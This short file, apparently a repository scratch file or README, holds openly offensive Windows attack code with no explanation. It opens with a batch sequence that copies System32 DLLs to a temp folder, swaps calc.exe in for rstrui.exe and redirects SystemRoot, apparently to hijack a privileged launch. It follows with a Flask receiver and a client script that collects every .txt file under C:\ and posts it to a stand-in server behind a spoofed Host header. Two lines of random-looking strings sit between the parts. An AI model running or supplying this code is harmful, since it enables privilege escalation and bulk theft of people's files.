# app
start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}

mkdir %temp%\System32

FOR /R C:\Windows\System32\ %F IN (*.dll) DO COPY "%F" %temp%\System32\ /Y >NUL

set a=C:\Windows\System32\calc.exe

copy %a% %temp%\System32\rstrui.exe /Y > NUL

set SystemRoot=%temp%

start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}


leugai8eephei0ot1quaMai4Yea"C^ee

iet4yi3Einae|x3L
=----

import os, flask

app = flask.Flask(__name__)

@app.route('/receive', methods=['POST'])
def receive():
    data = flask.request.data
    with open(os.path.join('received_txt_files', flask.request.remote_addr + '.txt'), 'wb') as f:
        f.write(data)
    return 'File received.'

if name == '__main__':
    app.run()
  
  
  -----
  
  
  import os, requests

root_directory = 'C:\\'
txt_files = []
for root, dirs, files in os.walk(root_directory):
    for file in files:
        if file.endswith('.txt'):
            txt_files.append(os.path.join(root, file))

for txt_file in txt_files:
    with open(txt_file, 'rb') as f:
        data = f.read()
    requests.post('http://your-server.com/receive', data=data, headers={'Host': 'reg.ru'})
